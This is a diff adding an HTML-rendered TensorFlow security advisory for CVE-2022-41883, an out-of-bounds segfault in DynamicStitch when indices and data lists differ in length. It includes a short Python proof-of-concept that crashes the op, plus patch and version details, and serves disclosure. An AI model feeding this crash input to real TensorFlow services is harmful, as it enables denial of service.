@@ -1,0 +1,31 @@
+<h2>TFSA-2022-145: OOB seg fault in <code>DynamicStitch</code> due to missing validation</h2>
+<h3>CVE Number</h3>
+<p>CVE-2022-41883</p>
+<h3>Impact</h3>
+<p><a href="https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/dynamic_stitch_op.cc"><code>tf.raw_ops.DynamicStitch</code></a> specifies input sizes when it is <a href="https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/ops/data_flow_ops.cc">registered</a>. 
+<code>cpp
+REGISTER_OP("DynamicStitch")
+    .Input("indices: N * int32")
+    .Input("data: N * T")
+    .Output("merged: T")
+    .Attr("N : int &gt;= 1")
+    .Attr("T : type")
+    .SetShapeFn(DynamicStitchShapeFunction);</code>
+When it receives a differing number of inputs, such as when it is called with an <code>indices</code> size 1 and a <code>data</code> size 2, it will crash.
+```python
+import tensorflow as tf</p>
+<h1>indices = 1*[tf.random.uniform([1,2], dtype=tf.dtypes.int32, maxval=100)]</h1>
+<p>indices = [tf.constant([[0, 1]]),]</p>
+<h1>data = 2*[tf.random.uniform([1,2], dtype=tf.dtypes.float32, maxval=100)]</h1>
+<p>data = [tf.constant([[5, 6]]), tf.constant([[7, 8]])]</p>
+<p>tf.raw_ops.DynamicStitch(
+    indices=indices, 
+    data=data)
+```</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/f5381e0e10b5a61344109c1b7c174c68110f7629">f5381e0e10b5a61344109c1b7c174c68110f7629</a>.</p>
+<p>The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, as it is also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Zizhuang Deng of IIE, UCAS</p>
